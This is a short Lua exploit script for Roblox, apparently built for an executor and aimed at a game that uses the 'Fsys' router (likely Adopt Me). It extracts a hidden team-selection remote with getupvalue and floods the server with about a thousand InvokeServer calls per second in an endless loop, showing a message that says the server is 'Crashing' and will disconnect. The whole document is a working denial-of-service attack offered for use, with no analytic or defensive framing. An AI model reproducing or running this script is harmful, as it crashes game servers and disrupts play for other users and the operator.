game:FindService("RunService"):Set3dRenderingEnabled(false) --saves on CPU
local remote = getupvalue(require(game:GetService("ReplicatedStorage"):WaitForChild("Fsys")).load("RouterClient").init,4)['TeamAPI/ChooseTeam']
local msg = Instance.new("Message",game:FindService("CoreGui"))
local task = task
local pcall = pcall

local function functioninquestion()
    pcall(function()
        remote:InvokeServer("Babies",true)
    end)
end

task.spawn(function()
    for i = 1,math.huge do
        msg.Text = "| Made by Amity |\nCrashing Please wait until you are disconnected\nExpected time to crash: 120 seconds\nElapsed time: "..i
        wait(1)
    end
end)

while task.wait(0.1) do
    for i = 1,100 do
        task.spawn(functioninquestion)
    end
end
